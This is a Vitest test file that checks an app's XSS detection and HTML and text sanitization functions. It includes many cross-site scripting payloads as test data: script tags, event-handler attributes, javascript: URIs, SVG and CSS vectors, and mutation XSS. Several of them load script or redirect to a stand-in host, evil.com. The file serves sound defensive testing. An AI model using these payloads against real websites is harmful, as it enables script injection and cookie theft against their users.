/**
 * XSS (Cross-Site Scripting) Prevention Tests
 */

import { describe, it, expect } from 'vitest';
import { hasXSSPattern, sanitizeHtml, sanitizeText, validateInput } from '@/lib/validation';

describe('XSS Prevention', () => {
  describe('XSS Pattern Detection', () => {
    it('should detect script tag injection', () => {
      const maliciousInputs = [
        '<script>alert("XSS")</script>',
        '<script src="http://evil.com/malicious.js"></script>',
        '<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
        '<script>document.cookie</script>',
      ];
      
      maliciousInputs.forEach(input => {
        expect(hasXSSPattern(input)).toBe(true);
      });
    });
    
    it('should detect event handler injection', () => {
      const maliciousInputs = [
        '<img src=x onerror="alert(\'XSS\')">',
        '<body onload="alert(\'XSS\')">',
        '<div onmouseover="alert(\'XSS\')">Hover me</div>',
        '<input onfocus="alert(\'XSS\')" autofocus>',
        '<svg onload="alert(\'XSS\')">',
      ];
      
      maliciousInputs.forEach(input => {
        expect(hasXSSPattern(input)).toBe(true);
      });
    });
    
    it('should detect iframe injection', () => {
      const maliciousInputs = [
        '<iframe src="http://evil.com"></iframe>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
      ];
      
      maliciousInputs.forEach(input => {
        expect(hasXSSPattern(input)).toBe(true);
      });
    });
    
    it('should detect javascript protocol injection', () => {
      const maliciousInputs = [
        '<a href="javascript:alert(\'XSS\')">Click me</a>',
        '<img src="javascript:alert(\'XSS\')">',
        'javascript:void(alert("XSS"))',
      ];
      
      maliciousInputs.forEach(input => {
        expect(hasXSSPattern(input)).toBe(true);
      });
    });
    
    it('should detect object and embed tags', () => {
      const maliciousInputs = [
        '<object data="http://evil.com/malicious.swf"></object>',
        '<embed src="http://evil.com/malicious.swf">',
        '<object type="text/x-scriptlet" data="http://evil.com"></object>',
      ];
      
      maliciousInputs.forEach(input => {
        expect(hasXSSPattern(input)).toBe(true);
      });
    });
    
    it('should detect DOM manipulation attempts', () => {
      const maliciousInputs = [
        'document.write("<script>alert(\'XSS\')</script>")',
        'document.location = "http://evil.com"',
        'window.location.href = "http://evil.com"',
        'document.cookie',
        'eval("alert(\'XSS\')")',
      ];
      
      maliciousInputs.forEach(input => {
        expect(hasXSSPattern(input)).toBe(true);
      });
    });
    
    it('should allow legitimate HTML-like content', () => {
      const legitimateInputs = [
        'The price is < $100',
        'Email me at user@example.com',
        'Math: 5 > 3',
        'Use the <Enter> key',
        'This is a normal comment.',
      ];
      
      legitimateInputs.forEach(input => {
        expect(hasXSSPattern(input)).toBe(false);
      });
    });
  });
  
  describe('HTML Sanitization', () => {
    it('should remove dangerous script tags', () => {
      const dirty = '<p>Hello</p><script>alert("XSS")</script><p>World</p>';
      const clean = sanitizeHtml(dirty);
      expect(clean).not.toContain('<script>');
      expect(clean).not.toContain('alert');
      expect(clean).toContain('<p>Hello</p>');
      expect(clean).toContain('<p>World</p>');
    });
    
    it('should remove event handlers', () => {
      const dirty = '<p onclick="alert(\'XSS\')">Click me</p>';
      const clean = sanitizeHtml(dirty);
      expect(clean).not.toContain('onclick');
      expect(clean).not.toContain('alert');
      expect(clean).toContain('<p>Click me</p>');
    });
    
    it('should allow safe HTML tags', () => {
      const safe = '<p>This is <strong>bold</strong> and <em>italic</em> text.</p>';
      const clean = sanitizeHtml(safe);
      expect(clean).toContain('<strong>bold</strong>');
      expect(clean).toContain('<em>italic</em>');
    });
    
    it('should remove data URIs', () => {
      const dirty = '<img src="data:text/html,<script>alert(\'XSS\')</script>">';
      const clean = sanitizeHtml(dirty);
      expect(clean).not.toContain('data:');
      expect(clean).not.toContain('<img');
    });
    
    it('should handle nested XSS attempts', () => {
      const dirty = '<div><script><script>alert("XSS")</script></script></div>';
      const clean = sanitizeHtml(dirty);
      expect(clean).not.toContain('script');
      expect(clean).not.toContain('alert');
    });
  });
  
  describe('Text Sanitization', () => {
    it('should escape HTML entities', () => {
      const input = '<script>alert("XSS")</script>';
      const sanitized = sanitizeText(input);
      expect(sanitized).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;');
    });
    
    it('should handle special characters', () => {
      const input = '& < > " \' /';
      const sanitized = sanitizeText(input);
      expect(sanitized).toBe('&amp; &lt; &gt; &quot; &#x27; &#x2F;');
    });
    
    it('should preserve legitimate text', () => {
      const input = 'This is a normal sentence with numbers 123.';
      const sanitized = sanitizeText(input);
      expect(sanitized).toBe('This is a normal sentence with numbers 123.');
    });
  });
  
  describe('Input Validation with XSS Prevention', () => {
    it('should reject XSS attempts in text input', () => {
      const result = validateInput('<script>alert("XSS")</script>', 'text');
      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Input contains potentially dangerous script patterns');
    });
    
    it('should sanitize HTML in text fields', () => {
      const result = validateInput('Hello <b>World</b>', 'text');
      expect(result.sanitized).not.toContain('<b>');
      expect(result.sanitized).toBe('Hello &lt;b&gt;World&lt;&#x2F;b&gt;');
    });
    
    it('should handle encoded XSS attempts', () => {
      const encodedXSS = '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E';
      const decoded = decodeURIComponent(encodedXSS);
      const result = validateInput(decoded, 'text');
      expect(result.isValid).toBe(false);
    });
  });
  
  describe('SVG XSS Prevention', () => {
    it('should detect SVG-based XSS', () => {
      const svgXSS = [
        '<svg onload="alert(\'XSS\')">',
        '<svg><script>alert("XSS")</script></svg>',
        '<svg><animate onbegin="alert(\'XSS\')" />',
      ];
      
      svgXSS.forEach(input => {
        expect(hasXSSPattern(input)).toBe(true);
      });
    });
  });
  
  describe('CSS Injection Prevention', () => {
    it('should detect CSS-based XSS', () => {
      const cssXSS = [
        '<style>body { background: url("javascript:alert(\'XSS\')"); }</style>',
        '<div style="background-image: url(\'javascript:alert(\\\'XSS\\\')\')">',
        '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
      ];
      
      cssXSS.forEach(input => {
        expect(hasXSSPattern(input)).toBe(true);
      });
    });
  });
  
  describe('Mutation XSS Prevention', () => {
    it('should handle mXSS attempts', () => {
      const mXSS = '<noscript><p title="</noscript><script>alert(\'XSS\')</script>">';
      const result = validateInput(mXSS, 'text');
      expect(result.isValid).toBe(false);
    });
  });
});